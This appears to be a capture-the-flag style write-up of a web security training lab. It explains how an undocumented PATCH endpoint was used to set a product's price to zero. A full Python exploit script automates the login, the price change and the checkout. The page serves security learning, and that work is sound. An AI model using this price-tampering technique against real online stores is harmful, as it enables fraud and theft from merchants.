@@ -1,0 +1,128 @@
+---
+title: 'API Lab 3'
+description: 'Finding and exploiting an unused API endpoint to manipulate product pricing'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Finding and exploiting an unused API endpoint
+
+<div style="text-align: justify;">
+  In this lab, I discovered and exploited a hidden API endpoint that allowed me to change the price of a product. The application exposes a product API (for example `/api/products/1/price`) used by the product page. By inspecting the API with Burp Suite and changing the HTTP method from `GET` to `OPTIONS` and then to `PATCH`, I found that the server accepted `PATCH` for updating the product. After authenticating as <code>wiener:peter</code>, sending a `PATCH` request with the correct `Content-Type: application/json` and a JSON body `{"price":0}` successfully set the product price to $0.00. Finally I added the item to the cart and placed the order to solve the lab.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- Inspect the product API request in Proxy > HTTP history (e.g. `/api/products/1/price`).
+- Send the request to Repeater and use `OPTIONS` to enumerate allowed methods (server may respond with `GET, PATCH`).
+- Switch the method to `PATCH` — an unauthenticated request may return `Unauthorized`, indicating authentication is required.
+- Log in to the app using `wiener:peter`.
+- In Repeater, set `Content-Type: application/json` and use a JSON body; start with `{}` to observe error messages.
+- Add the required `price` parameter, e.g. `{"price":0}`, and send the `PATCH` request.
+- Reload the product page, add the (now free) product to the basket and place the order to complete the lab.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import sys
+import re
+import requests
+import urllib3
+from bs4 import BeautifulSoup
+
+# silence lab/self-signed cert warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# proxy + creds (default)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+USERNAME, PASSWORD = "wiener", "peter"
+PRODUCT_ID = "1"   # lab-known product id
+TIMEOUT = 8
+
+# simple session with Burp proxy
+S = requests.Session()
+S.verify = False
+S.proxies.update(proxies)
+
+
+def extract_csrf(html):
+    """Return first input[name=csrf] value or None."""
+    m = re.search(r'name=["\']?csrf["\']?\s+value=["\']([^"\']+)', html, re.IGNORECASE)
+    return m.group(1) if m else None
+
+
+def fetch(path):
+    return S.get(BASE + path, allow_redirects=False, timeout=TIMEOUT)
+
+
+def post(path, data=None, json=None):
+    return S.post(BASE + path, data=data, json=json, allow_redirects=False, timeout=TIMEOUT)
+
+
+def patch(path, json_body):
+    return S.request("PATCH", BASE + path, json=json_body,
+                     headers={"Content-Type": "application/json"}, allow_redirects=False, timeout=TIMEOUT)
+
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} https://<lab-id>.web-security-academy.net")
+        sys.exit(1)
+
+    global BASE
+    BASE = sys.argv[1].rstrip("/")
+
+    # 1) fetch login page -> extract csrf & initial session cookie
+    r = fetch("/login")
+    csrf = extract_csrf(r.text)
+    initial_session = r.cookies.get("session")
+    if initial_session:
+        S.cookies.set("session", initial_session)
+
+    # 2) login as wiener
+    payload = {"username": USERNAME, "password": PASSWORD}
+    if csrf:
+        payload["csrf"] = csrf
+    r = post("/login", data=payload)
+    new_session = r.cookies.get("session") or S.cookies.get("session")
+    if not new_session:
+        print("[-] Login failed (no session).")
+        sys.exit(1)
+    S.cookies.set("session", new_session)
+    print("[+] Logged in")
+
+    # 3) PATCH product price -> 0
+    print(f"[*] Patching /api/products/{PRODUCT_ID}/price -> 0")
+    r = patch(f"/api/products/{PRODUCT_ID}/price", {"price": 0})
+    print(f"    PATCH status: {r.status_code}")
+
+    # 4) Add product to cart (lab form)
+    post("/cart", data={"productId": PRODUCT_ID, "redir": "PRODUCT", "quantity": "1"})
+    print("[+] Added to cart (best-effort)")
+
+    # 5) Fetch cart and extract csrf for checkout
+    r = fetch("/cart")
+    csrf_cart = extract_csrf(r.text)
+    if not csrf_cart:
+        print("[-] No CSRF on cart page; open lab in browser and finish checkout manually.")
+        sys.exit(1)
+
+    # 6) Checkout
+    post("/cart/checkout", data={"csrf": csrf_cart})
+    # 7) Final confirmation hit (lab expects this)
+    fetch("/cart/order-confirmation?order-confirmed=true")
+
+    print("[✓] Done — verify the lab in the browser.")
+
+if __name__ == "__main__":
+    main()
+```
